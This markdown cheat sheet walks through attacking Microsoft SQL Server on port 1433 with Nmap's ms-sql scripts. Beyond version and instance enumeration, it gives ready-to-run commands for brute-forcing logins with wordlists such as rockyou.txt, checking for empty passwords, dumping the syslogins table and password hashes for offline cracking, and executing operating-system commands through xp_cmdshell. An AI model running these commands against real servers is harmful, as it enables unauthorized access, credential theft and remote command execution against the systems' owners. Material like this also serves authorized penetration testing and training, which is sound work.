

# üß† MSSQL Enumeration with Nmap Scripts

When a target is suspected to be running **Microsoft SQL Server (MSSQL)**, port **1433** is typically used for the service. Nmap provides a powerful set of scripts (`ms-sql-*`) to enumerate, brute-force, and exploit MSSQL services.

---

## üîç Step-by-Step MSSQL Enumeration

### 1. Basic Version Detection

```bash
nmap <IP> -p 1433 -sV
```

**Explanation**:
Scans the MSSQL default port (**1433**) and detects the version of the running service.

---

### 2. Get MSSQL Instance Information

```bash
nmap <IP> -p 1433 --script ms-sql-info
```

**Explanation**:
Gathers general information about the MSSQL server, including instance name, hostname, service pack, etc.

---

### 3. Get NTLM Info from SQL Server

```bash
nmap <IP> -p 1433 --script ms-sql-ntlm-info --script-args mssql-instance-port=1433
```

**Explanation**:
Retrieves **NTLM authentication information** from the server using SQL Server services. Helpful for Windows environment reconnaissance.

---

### 4. Brute Force MSSQL Credentials

```bash
nmap <IP> -p 1433 --script ms-sql-brute --script-args userdb=/path/to/userlist.txt,passdb=/path/to/passlist.txt
```

**Explanation**:
Performs brute-force attack against the MSSQL server using username and password wordlists.


---

### 5. Check for Empty Password Logins

```bash
nmap <IP> -p 1433 --script ms-sql-empty-password
```

**Explanation**:
Checks if any accounts are configured with **no password**, a common misconfiguration.

---

### 6. Run Arbitrary SQL Queries (Authenticated)

```bash
nmap <IP> -p 1433 --script ms-sql-query --script-args \
  mssql.username=admin,mssql.password=passwd, \
  ms-sql-query.query="SELECT * FROM master.syslogins" \
  -oN output.txt
```

**Explanation**:
Executes a custom SQL query (in this case, dumps user login info) using valid credentials. Saves output to a file.


---

### 7. Dump Password Hashes from MSSQL

```bash
nmap <IP> -p 1433 --script ms-sql-dump-hashes --script-args \
  mssql.username=admin,mssql.password=password
```

**Explanation**:
Dumps password hashes stored in the database. Useful for offline password cracking.

---

### 8. Execute OS Commands via xp\_cmdshell

```bash
nmap <IP> -p 1433 --script ms-sql-xp-cmdshell --script-args \
  mssql.username=admin,mssql.password=password, \
  ms-sql-xp-cmdshell.cmd="ipconfig"
```

**Explanation**:
Executes **OS-level commands** using the extended stored procedure `xp_cmdshell` (if enabled), which can lead to full **RCE (Remote Command Execution)**.


---

## ‚úÖ Summary Checklist

| Task                    | Command Used                     |
| ----------------------- | -------------------------------- |
| Version Detection       | `-sV`                            |
| Instance Info           | `--script ms-sql-info`           |
| NTLM Info               | `--script ms-sql-ntlm-info`      |
| Brute Force Credentials | `--script ms-sql-brute`          |
| Empty Password Check    | `--script ms-sql-empty-password` |
| Custom SQL Query        | `--script ms-sql-query`          |
| Dump Hashes             | `--script ms-sql-dump-hashes`    |
| OS Command Execution    | `--script ms-sql-xp-cmdshell`    |

---

> ‚ö†Ô∏è **Tips**:
>
> * Always start with version detection (`-sV`) and use `--script-help <script>` to see script documentation.
> * Make sure MSSQL port 1433 is open and accessible.
> * Use strong wordlists for brute-force: try `/usr/share/wordlists/rockyou.txt`.
